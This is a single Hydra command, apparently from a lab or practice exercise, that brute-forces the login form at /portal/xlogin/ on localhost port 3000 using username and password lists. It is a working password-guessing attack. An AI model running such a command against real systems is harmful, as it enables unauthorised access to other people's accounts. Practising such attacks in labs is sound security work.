hydra -L u_list.txt -P p_list.txt -s 3000 localhost http-post-form "/
    portal/xlogin/:user=^USER^&pw=^PASS^:F=Invalid"
